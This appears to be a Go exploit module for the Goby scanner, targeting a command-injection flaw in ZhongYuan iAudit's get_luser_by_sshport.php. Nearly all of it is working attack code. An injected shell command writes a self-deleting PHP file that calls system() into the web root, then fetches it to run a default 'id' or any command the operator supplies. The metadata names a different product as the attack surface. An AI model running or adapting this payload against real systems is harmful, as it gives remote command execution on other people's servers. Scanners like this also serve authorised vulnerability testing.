package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "ZhongYuan iAudit get_luser_by_sshport.php RCE",
  "Description": "ZhongYuan iAudit get_luser_by_sshport.php ,The existence of command splicing leads to remote command execution vulnerability",
  "Product": "ZhongYuan iAudit",
  "Homepage": "https://www.tosec.com.cn/",
  "DisclosureDate": "2021-06-01",
  "Author": "PeiQi",
  "GobyQuery": "body=\"admin.php?controller=admin_index&amp;action=chklogin&amp;ref\"",
  "Level": "3",
  "Impact": "<p>The existence of command splicing leads to remote command execution vulnerability<br></p>",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "WangKang Next generation firewall"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>Upgrade version<br></p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8) + ".php"
		    uri_1 := "/get_luser_by_sshport.php?clientip=1;echo%20'%3C%3Fphp%20system(%22id%22)%3Bunlink(__FILE__)%3F%3E'>/opt/freesvr/web/htdocs/freesvr/audit/" + randomStr + ";&clientport=1"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/json")
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
        		if resp.StatusCode == 200 {
        		    uri_2 := "/" + randomStr
        		    cfg_2 := httpclient.NewGetRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
        			    return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
        			}
        		}
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomStr := goutils.RandomHexString(8) + ".php"
		    cmd := ss.Params["Cmd"].(string)
		    uri_1 := "/get_luser_by_sshport.php?clientip=1;echo%20'%3C%3Fphp%20system(%22" + cmd + "%22)%3Bunlink(__FILE__)%3F%3E'>/opt/freesvr/web/htdocs/freesvr/audit/" + randomStr + ";&clientport=1"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/json")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
        		if resp.StatusCode == 200 {
        		    uri_2 := "/" + randomStr
        		    cfg_2 := httpclient.NewGetRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
        			    expResult.Output = resp.Utf8Html
        		        expResult.Success = true
        			}
        		}
        	}
			return expResult
		},
	))
}